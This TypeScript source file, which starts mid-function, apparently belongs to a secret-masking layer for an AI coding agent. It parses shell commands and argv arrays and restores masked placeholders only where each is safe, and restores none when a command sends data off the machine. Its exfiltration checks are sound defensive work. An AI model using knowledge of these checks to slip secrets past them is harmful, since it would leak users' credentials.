    return readHeredocOperator(command, i, frame, pending, scan);
  }
  if (ch === '$' && command[i + 1] === "'") {
    stack.push({ kind: 'ansi', depth: 0, cmdStart: 0 });
    return 2;
  }
  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
  else if (frame.kind === 'subst') trackParens(stack, frame, ch, i, scan);
  if (separatesCommands(command, i)) {
    scan.commands.push([frame.cmdStart, i]);
    frame.cmdStart = i + 1;
  }
  return 1;
}

/** True when the character at `i` of shell code ends a simple command.
 * `{` only as the grouping word (`{ cmd; }`), not in `${x}` or `-I{}`;
 * `&` only as an operator, not in a redirection (`2>&1`, `&>log`). */
function separatesCommands(command: string, i: number): boolean {
  const ch = command[i];
  if (ch === undefined || !COMMAND_SEPARATORS.has(ch)) return false;
  if (ch === '{') return startsWord(command, i) && WHITESPACE.test(command[i + 1] ?? '');
  if (ch !== '&') return true;
  return !REDIRECTION_SIDES.has(command[i - 1] ?? '') && command[i + 1] !== '>';
}

/** True when the character at `i` begins a word of shell code. */
function startsWord(command: string, i: number): boolean {
  const before = command[i - 1];
  return before === undefined || COMMENT_PRECEDERS.has(before);
}

/** A comment runs to the end of its line; the newline is left to the
 * caller, since heredoc bodies may start after it. */
function commentLength(command: string, i: number): number {
  const newline = command.indexOf('\n', i);
  return (newline === -1 ? command.length : newline) - i;
}

function trackParens(
  stack: Frame[],
  frame: Frame,
  ch: string | undefined,
  i: number,
  scan: Scan,
): void {
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth === 0) closeCommand(stack, frame, i, scan);
  else frame.depth -= 1;
}

/** Close a substitution at `i`, recording its last simple command. */
function closeCommand(stack: Frame[], frame: Frame, i: number, scan: Scan): void {
  scan.commands.push([frame.cmdStart, i]);
  stack.pop();
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * `<<<` is a here-string: the word after it is an ordinary argument. */
function readHeredocOperator(
  command: string,
  i: number,
  frame: Frame,
  pending: Heredoc[],
  scan: Scan,
): number {
  if (command[i + 2] === '<') return 3;
  scan.heredocOperator.lastIndex = i;
  const m = scan.heredocOperator.exec(command);
  if (m === null) {
    pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
    return 2;
  }
  if (scan.heredocCommand.start !== frame.cmdStart) {
    const head = command.slice(frame.cmdStart, Math.min(i, frame.cmdStart + MAX_WORD_SCAN));
    scan.heredocCommand = { start: frame.cmdStart, word: commandWord(head) };
  }
  const word = scan.heredocCommand.word;
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: HEREDOC_DATA_COMMANDS.has(word) && !pipedLater(command, i, scan),
  });
  return m[0].length;
}

/** True when a `|` follows `i` on its line. The line's end and last `|`
 * are found once per line. */
function pipedLater(command: string, i: number, scan: Scan): boolean {
  if (i > scan.line.end) {
    const newline = command.indexOf('\n', i);
    const end = newline === -1 ? command.length : newline;
    let lastPipe = -1;
    for (let k = end - 1; k > i; k--) {
      if (command[k] === '|') {
        lastPipe = k;
        break;
      }
    }
    scan.line = { end, lastPipe };
  }
  return scan.line.lastPipe > i;
}

/** The program a simple command runs: its first word that is not an
 * environment assignment, without a directory (`/bin/cat` → `cat`). */
function commandWord(text: string): string {
  const word = text
    .trim()
    .split(/\s+/)
    .find((w) => !ENV_ASSIGNMENT.test(w));
  return word?.split('/').at(-1) ?? '';
}

/** Walk the bodies of the heredocs that start at `start`, in order,
 * recording the targets in each; return where shell code resumes, or
 * `undefined` when a body has no closing line. */
function readHeredocBodies(
  command: string,
  start: number,
  pending: readonly Heredoc[],
  scan: Scan,
): number | undefined {
  let bodyStart = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc);
    if (end === undefined) return undefined;
    readBody(command, bodyStart, end.bodyEnd, heredoc, scan);
    bodyStart = end.next;
  }
  return bodyStart;
}

/** Record the targets in one body. A bare-delimiter body is lexed too,
 * since its substitutions run whatever reads the body. */
function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
  // A body that expands keeps its substitutions in the text the network
  // checks read; one with none is plain text.
  const expands = !heredoc.literal && /[$`]/.test(command.slice(start, end));
  if (heredoc.data && !expands) scan.dataBodies.push([start, end]);
  if (!heredoc.data) record(scan, end - 1, 'none');
  else if (heredoc.literal) record(scan, end - 1, 'heredoc');
  if (heredoc.literal) return;
  lex(command, start, end, { kind: 'body', depth: 0, cmdStart: 0 }, scan);
}

/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= command.length) {
    const newline = command.indexOf('\n', lineStart);
    const lineEnd = newline === -1 ? command.length : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`), and
 * none in a command that sends data off the machine (`sendsOffMachine`).
 * The command is read once, as received: a value restored there never
 * ends its quoting or its heredoc, so it cannot change the context of a
 * later placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const starts = [...command.matchAll(placeholderPattern())].map((m) => m.index);
  const verdict = judge(command, starts);
  return restoreEach(np, command, sessionId, (value, at) => {
    if (verdict.offMachine || verdict.programAt.has(at)) return false;
    return shellSafe(value, verdict.contextAt.get(at) ?? 'none');
  });
}

/** A shell `command` given as an argv array, with its safe placeholders
 * restored. */
export interface ShellArgvRestore {
  readonly argv: readonly string[];
  readonly results: readonly RestoreResult[];
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders of a `command` given as an argv array, as
 * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
 * runs without a shell, but the same rules hold as in a string command:
 * - nothing is restored when the program sends data off the machine, or
 *   runs code that may;
 * - a value is restored only as one plain word, and never into the program
 *   itself;
 * - the script a shell runs (`bash -lc "…"`) is judged as a string
 *   command, program positions and data heredocs included.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellArgv(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
): ShellArgvRestore {
  const length = argv.reduce((n, a) => n + a.length, 0);
  const offline = length <= MAX_COMMAND_CHARS && !argvSendsOffMachine(argv);
  const program = argvProgramIndex(argv);
  const script = shellScriptIndex(argv, program);
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  const restored = argv.map((word, position) => {
    const r =
      position === script && offline
        ? restoreShellCommand(np, word, sessionId)
        : restoreEach(
            np,
            word,
            sessionId,
            (value) => offline && position !== program && PLAIN_WORD.test(value),
          );
    results.push(...r.results);
    keptMasked.push(...r.keptMasked);
    return r.command;
  });
  return { argv: restored, results, keptMasked };
}

/** Shells whose `-c` argument is a script. */
const ARGV_SHELLS: ReadonlySet<string> = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'mksh']);
/** A shell option cluster that holds `c`: the next argument is the script. */
const SCRIPT_FLAG = /^-[A-Za-z]*c[A-Za-z]*$/;

/** The index of the program an argv array runs, past keywords,
 * assignments, redirections and wrappers. */
function argvProgramIndex(argv: readonly string[]): number {
  const words = argv.map((text) => ({ text, computed: false }));
  let k = skipPrefix(words, 0);
  for (;;) {
    const text = words[k]?.text;
    if (text === undefined) return k;
    const name = normalise(text);
    const options = WRAPPERS.get(name);
    if (options === undefined) return k;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** The index of the script a shell program runs with `-c`, or -1. */
function shellScriptIndex(argv: readonly string[], program: number): number {
  const name = argv[program];
  if (name === undefined || !ARGV_SHELLS.has(normalise(name))) return -1;
  for (let k = program + 1; k < argv.length; k++) {
    if (SCRIPT_FLAG.test(argv[k] ?? '')) return k + 1;
    if (!(argv[k] ?? '').startsWith('-')) return -1;
  }
  return -1;
}

/** The program an argv array runs, every word literal. */
function argvProgram(argv: readonly string[]): Program | undefined {
  return programOf(argv.map((text) => ({ text, computed: false })));
}

function argvRunsCode(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  return (
    (program !== undefined && runsCode(program)) || argv.some((a) => NESTED_INTERPRETER.test(a))
  );
}

/** True when an argv command sends data out: its program does, an
 * argument names a network client, or it runs code (each argument then
 * read as a shell command) that does. */
function argvSendsOffMachine(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  if (program !== undefined && sendsOut(program)) return true;
  if (program?.name !== undefined && ANY_DELIMITER_PROGRAMS.has(program.name)) return true;
  if (argv.some((a) => ANY_DELIMITER_IN_TEXT.test(a))) return true;
  if (argv.some((a) => NETWORK_CLIENT.test(a))) return true;
  if (!argvRunsCode(argv)) return false;
  return argv.some((a) => NETWORK_IN_CODE.test(a) || sendsOffMachine(a));
}

/** Restore each placeholder of `text` whose real value `safe` accepts at
 * the placeholder's index; leave the others literal. */
function restoreEach(
  np: RestoreCapable,
  text: string,
  sessionId: string,
  safe: (value: string, at: number) => boolean,
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of text.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const ok = r.replacements === 0 || safe(r.restored, start);
    if (ok) results.push(r);
    else keptMasked.push(placeholder);
    out += text.slice(last, start) + (ok ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + text.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return placeholdersIn(text).length;
}

/** The placeholders `text` holds, in order, once per occurrence. */
export function placeholdersIn(text: string): string[] {
  return [...text.matchAll(placeholderPattern())].map((m) => m[0]);
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
